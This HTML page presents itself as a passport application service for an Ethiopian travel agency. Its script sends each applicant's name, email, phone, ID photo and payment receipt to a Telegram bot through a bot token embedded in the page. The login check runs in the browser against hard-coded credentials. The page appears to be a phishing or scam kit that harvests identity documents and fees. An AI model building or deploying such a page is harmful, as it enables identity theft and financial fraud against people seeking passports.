<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mesrak Travel Agency | Passport Services</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
    <!-- Font Awesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
    <!-- Confetti JS for Success Animation -->
    <script src="https://cdn.jsdelivr.net/npm/confetti-js@0.0.18/dist/confetti.min.js"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f4f4;
            color: #333;
        }
        .section {
            padding: 60px 0;
            text-align: center;
            display: none; /* Hidden by default */
            animation: fadeIn 1s ease-in;
        }
        .active {
            display: block; /* Show active section */
        }
        .container-custom {
            max-width: 800px;
            margin: 0 auto;
            padding: 0 15px;
        }
        h1 {
            color: #009639;
            margin-bottom: 20px;
        }
        h1 i {
            margin-right: 10px;
        }
        .form-label {
            font-weight: bold;
            color: #333;
            display: flex;
            align-items: center;
        }
        .form-label i {
            margin-right: 8px;
        }
        .form-control, .form-select {
            border-radius: 8px;
        }
        .btn-primary {
            background-color: #009639;
            border: none;
            padding: 12px;
            font-size: 16px;
        }
        .btn-primary:hover {
            background-color: #007d2f;
        }
        .payment-category {
            margin-bottom: 20px;
        }
        .payment-category h4 {
            color: #009639;
            font-size: 18px;
            margin-bottom: 10px;
        }
        .payment-methods {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            justify-content: center;
        }
        .payment-card {
            width: 120px;
            padding: 10px;
            border: 2px solid #ddd;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            background-color: #fff;
        }
        .payment-card:hover {
            border-color: #009639;
        }
        .payment-card.selected {
            border-color: #009639;
            background-color: #e6f3e6;
        }
        .payment-card img, .payment-card i {
            width: 50px;
            height: 50px;
            margin-bottom: 5px;
        }
        .payment-card span {
            display: block;
            font-size: 14px;
        }
        .badge {
            background-color: #ffcc00;
            color: #333;
            font-size: 12px;
            padding: 5px 10px;
            border-radius: 15px;
            position: absolute;
            top: -10px;
            right: -10px;
        }
        .payment-instructions {
            margin-top: 20px;
            padding: 15px;
            border: 2px solid #009639;
            border-radius: 10px;
            background-color: #f0f8f0;
        }
        .payment-instructions h5 {
            color: #009639;
            margin-bottom: 10px;
            font-size: 18px;
        }
        .payment-instructions i {
            font-size: 24px;
            color: #009639;
            margin-right: 10px;
        }
        .payment-instructions p {
            margin: 0;
            font-size: 16px;
            color: #333;
        }
        .modal-content {
            border-radius: 15px;
        }
        .modal-header {
            background-color: #009639;
            color: white;
            border-bottom: none;
        }
        .modal-footer {
            border-top: none;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .preview-img {
            max-width: 250px;
            margin-top: 15px;
            border-radius: 10px;
            border: 2px solid #009639;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        .speed-option {
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            margin: 10px 0;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .speed-option:hover {
            border-color: #009639;
            background-color: rgba(0, 150, 57, 0.1);
        }
        .speed-option.selected {
            border-color: #009639;
            background-color: rgba(0, 150, 57, 0.2);
            box-shadow: 0 0 10px rgba(0, 150, 57, 0.5);
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <div class="container-custom">
            <a class="navbar-brand" href="#"><i class="fas fa-plane"></i> Mesrak Travel Agency</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item"><a class="nav-link" href="#home">Home</a></li>
                    <li class="nav-item"><a class="nav-link" href="#services">Services</a></li>
                    <li class="nav-item"><a class="nav-link" href="#passport">Passport</a></li>
                    <li class="nav-item"><a class="nav-link" href="#contact">Contact</a></li>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Login Section (Added from Second Code) -->
    <div id="login" class="section active">
        <div class="container-custom">
            <h1><i class="fas fa-passport"></i> Mesrak Travel Agency</h1>
            <p>Log in to Ethiopiaâ€™s premier passport service provider</p>
            <form id="login-form">
                <div class="mb-3">
                    <label for="username" class="form-label"><i class="fas fa-user"></i> Username</label>
                    <input type="text" class="form-control" id="username" required>
                </div>
                <div class="mb-3">
                    <label for="password" class="form-label"><i class="fas fa-lock"></i> Password</label>
                    <input type="password" class="form-control" id="password" required>
                </div>
                <button type="submit" class="btn btn-primary w-100"><i class="fas fa-sign-in-alt"></i> Log In</button>
            </form>
        </div>
    </div>

    <!-- Passport Section (Enhanced) -->
    <div id="passport" class="section">
        <div class="container-custom">
            <h1><i class="fas fa-passport"></i> Passport Application</h1>
            <p>Complete your application with Ethiopiaâ€™s trusted service.</p>
            <form id="application-form">
                <div class="mb-3">
                    <label for="full-name" class="form-label"><i class="fas fa-user"></i> Full Name</label>
                    <input type="text" class="form-control" id="full-name" required>
                </div>
                <div class="mb-3">
                    <label for="email" class="form-label"><i class="fas fa-envelope"></i> Email</label>
                    <input type="email" class="form-control" id="email" required>
                </div>
                <div class="mb-3">
                    <label for="phone" class="form-label"><i class="fas fa-phone"></i> Phone Number</label>
                    <input type="tel" class="form-control" id="phone" required>
                </div>
                <div class="mb-3">
                    <label for="service-type" class="form-label"><i class="fas fa-concierge-bell"></i> Service Type</label>
                    <select class="form-select" id="service-type" required>
                        <option value="">Select Service</option>
                        <option value="new">New Passport</option>
                        <option value="renewal">Passport Renewal</option>
                        <option value="replacement">Lost/Damaged Replacement</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="id-photo" class="form-label"><i class="fas fa-id-card"></i> ID Photo</label>
                    <input type="file" class="form-control" id="id-photo" accept="image/*" required>
                    <img id="id-photo-preview" class="preview-img" style="display: none;" alt="ID Photo Preview">
                </div>
                <div class="mb-3">
                    <label class="form-label"><i class="fas fa-credit-card"></i> Payment Method</label>
                    <div class="payment-category">
                        <h4>State-Owned Banks</h4>
                        <div class="payment-methods" id="state-banks"></div>
                    </div>
                    <div class="payment-category">
                        <h4>Private Banks</h4>
                        <div class="payment-methods" id="private-banks"></div>
                    </div>
                    <div class="payment-category">
                        <h4>Mobile Money</h4>
                        <div class="payment-methods" id="mobile-money"></div>
                    </div>
                    <input type="hidden" id="payment-method" required>
                </div>
                <div class="payment-instructions" id="payment-instructions" style="display: none;">
                    <h5>Payment Instructions</h5>
                    <div style="display: flex; align-items: center;">
                        <i class="fas fa-university"></i>
                        <p id="instruction-text"></p>
                    </div>
                </div>
                <div class="mb-3">
                    <label for="payment-receipt" class="form-label"><i class="fas fa-file-upload"></i> Upload Payment Receipt</label>
                    <input type="file" class="form-control" id="payment-receipt" accept="image/*" required>
                    <img id="payment-receipt-preview" class="preview-img" style="display: none;" alt="Payment Receipt Preview">
                </div>
                <div class="mb-3">
                    <label class="form-label"><i class="fas fa-clock"></i> Processing Speed</label>
                    <div class="speed-option" data-value="normal">
                        <i class="fas fa-walking"></i> <strong>Normal</strong> - 10-15 business days 5,000 ETB
                    </div>
                    <div class="speed-option" data-value="fast">
                        <i class="fas fa-rocket"></i> <strong>Fast</strong> - only 3-5 business days
                        15,000 ETB
                    </div>
                    <input type="hidden" id="processing-speed" required>
                </div>
                <button type="submit" class="btn btn-primary w-100" id="submit-btn"><i class="fas fa-passport"></i> Submit Application</button>
            </form>
        </div>
    </div>

    <!-- Success Modal -->
    <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="successModalLabel"><i class="fas fa-check-circle"></i> Application Submitted</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p>Your passport application has been successfully submitted! We will contact you soon.</p>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS and Popper.js -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js" integrity="sha384-fbbOQedDUMZZ5KreZpsbe1LCZPVmfTnH7ois6mU1QK+m14rQ1l2bGBq41eYeM/fS" crossorigin="anonymous"></script>
    <script>
        // Payment Methods Data
        const banks = [
            { name: 'Commercial Bank of Ethiopia', logo: 'https://example.com/cbe-logo.png', type: 'state', recommended: true },
      
        ];

        // Function to Create Payment Cards
        function createPaymentCard(bank) {
            const card = document.createElement('div');
            card.className = 'payment-card';
            card.innerHTML = `
                <img src="${bank.logo}" alt="${bank.name}" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                <i class="fas fa-university" style="display: none;"></i>
                <span>${bank.name}</span>
            `;
            if (bank.recommended) {
                card.innerHTML += '<span class="badge">Recommended</span>';
            }
            card.addEventListener('click', () => {
                document.querySelectorAll('.payment-card').forEach(c => c.classList.remove('selected'));
                card.classList.add('selected');
                document.getElementById('payment-method').value = bank.name;

                const instructionsDiv = document.getElementById('payment-instructions');
                const instructionText = document.getElementById('instruction-text');
                const icon = instructionsDiv.querySelector('i');
                if (bank.type === 'mobile') {
                    icon.className = 'fas fa-mobile-alt';
                    instructionText.textContent = 'Please send payment to our Telebirr number: 0987654321';
                } else {
                    icon.className = 'fas fa-university';
                    instructionText.textContent = 'Please transfer to our account at Commercial Bank of Ethiopia: Account Number 123456789';
                }
                instructionsDiv.style.display = 'block';
            });
            return card;
        }

        // Function to Show Sections
        function showSection(sectionId) {
            document.querySelectorAll('.section').forEach(section => section.classList.remove('active'));
            document.getElementById(sectionId).classList.add('active');
        }

        document.addEventListener('DOMContentLoaded', () => {
            const stateBanks = document.getElementById('state-banks');
            const privateBanks = document.getElementById('private-banks');
            const mobileMoney = document.getElementById('mobile-money');

            banks.forEach(bank => {
                const card = createPaymentCard(bank);
                if (bank.type === 'state') stateBanks.appendChild(card);
                else if (bank.type === 'private') privateBanks.appendChild(card);
                else if (bank.type === 'mobile') mobileMoney.appendChild(card);
            });

            // Login Form Submission
            const loginForm = document.getElementById('login-form');
            loginForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                // Simple validation (customize as needed)
                if (username === 'user' && password === 'pass') {
                    showSection('passport');
                } else {
                    alert('Invalid credentials');
                }
            });

            // File Previews
            document.getElementById('id-photo').addEventListener('change', (e) => {
                const file = e.target.files[0];
                if (file) {
                    const preview = document.getElementById('id-photo-preview');
                    preview.src = URL.createObjectURL(file);
                    preview.style.display = 'block';
                }
            });

            document.getElementById('payment-receipt').addEventListener('change', (e) => {
                const file = e.target.files[0];
                if (file) {
                    const preview = document.getElementById('payment-receipt-preview');
                    preview.src = URL.createObjectURL(file);
                    preview.style.display = 'block';
                }
            });

            // Processing Speed Selection
            const speedOptions = document.querySelectorAll('.speed-option');
            const processingSpeed = document.getElementById('processing-speed');
            speedOptions.forEach(option => {
                option.addEventListener('click', () => {
                    speedOptions.forEach(opt => opt.classList.remove('selected'));
                    option.classList.add('selected');
                    processingSpeed.value = option.getAttribute('data-value');
                });
            });

            // Application Form Submission
            const form = document.getElementById('application-form');
            form.addEventListener('submit', async (e) => {
                e.preventDefault();

                const fullName = document.getElementById('full-name').value;
                const email = document.getElementById('email').value;
                const phone = document.getElementById('phone').value;
                const serviceType = document.getElementById('service-type').value;
                const paymentMethod = document.getElementById('payment-method').value;
                const processingSpeedVal = document.getElementById('processing-speed').value;
                const idPhotoFile = document.getElementById('id-photo').files[0];
                const paymentReceiptFile = document.getElementById('payment-receipt').files[0];

                if (!processingSpeedVal) {
                    alert('Please select a processing speed');
                    return;
                }

                const botToken = '7503029328:AAGVGuzxpN56xWfsxTd_wlhLvOnm8PESXII'; // Replace with your Telegram Bot Token
                const chatId = '8155585808'; // Replace with your Telegram Chat ID
                const message = `ðŸŒ New Passport Application ðŸŒ\n\n` +
                                `ðŸ‘¤ Full Name: ${fullName}\n` +
                                `ðŸ“§ Email: ${email}\n` +
                                `ðŸ“ž Phone: ${phone}\n` +
                                `ðŸ›‚ Service Type: ${serviceType}\n` +
                                `ðŸ’³ Payment Method: ${paymentMethod}\n` +
                                `â³ Processing Speed: ${processingSpeedVal === 'normal' ? 'Normal (10-15 days)' : 'Fast (3-5 days)'}\n\n` +
                                `Verified by Mesrak Travel Agency`;

                try {
                    // Send text message
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                        .then(res => res.json())
                        .then(data => { if (!data.ok) throw new Error('Failed to send message'); });

                    // Send ID Photo
                    if (idPhotoFile) {
                        const idFormData = new FormData();
                        idFormData.append('chat_id', chatId);
                        idFormData.append('photo', idPhotoFile);
                        idFormData.append('caption', `ID Photo for ${fullName}`);
                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                            method: 'POST',
                            body: idFormData
                        })
                        .then(res => res.json())
                        .then(data => { if (!data.ok) throw new Error('Failed to send ID photo'); });
                    }

                    // Send Payment Receipt
                    if (paymentReceiptFile) {
                        const receiptFormData = new FormData();
                        receiptFormData.append('chat_id', chatId);
                        receiptFormData.append('photo', paymentReceiptFile);
                        receiptFormData.append('caption', `Payment Receipt for ${fullName}`);
                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                            method: 'POST',
                            body: receiptFormData
                        })
                        .then(res => res.json())
                        .then(data => { if (!data.ok) throw new Error('Failed to send payment receipt'); });
                    }

                    // Show success modal
                    const modal = new bootstrap.Modal(document.getElementById('successModal'));
                    modal.show();

                    // Confetti Celebration
                    const confettiSettings = { target: document.body, max: 100, size: 1, animate: true, clock: 25 };
                    const confetti = new ConfettiGenerator(confettiSettings);
                    confetti.render();
                    setTimeout(() => confetti.clear(), 3000);

                    // Reset form
                    form.reset();
                    document.getElementById('payment-instructions').style.display = 'none';
                    document.getElementById('id-photo-preview').style.display = 'none';
                    document.getElementById('payment-receipt-preview').style.display = 'none';
                    speedOptions.forEach(opt => opt.classList.remove('selected'));
                } catch (error) {
                    alert('Submission error: ' + error.message);
                }
            });
        });
    </script>
</body>
</html>